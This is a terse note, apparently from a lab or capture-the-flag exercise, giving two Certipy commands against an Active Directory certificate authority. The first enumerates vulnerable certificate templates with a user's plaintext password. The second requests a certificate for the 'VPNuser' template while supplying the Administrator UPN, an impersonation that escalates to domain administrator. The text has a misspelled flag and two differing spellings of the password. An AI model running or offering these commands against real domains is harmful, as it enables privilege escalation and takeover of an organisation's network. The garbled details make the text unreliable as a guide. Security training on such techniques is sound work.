use Certipy
find the domain and CA 
write certipy-ad -debug find -u Bob -p 'bob1sH@cker' -dc-ip 10.53.50.14 -vulenrable -stdout 

certipy-ad -debug req -u Bob -p 'b0b1sH@cker' -dc-ip 10.53.50.14 -ca CA-CYBER -template VPNuser -upn Administrator  

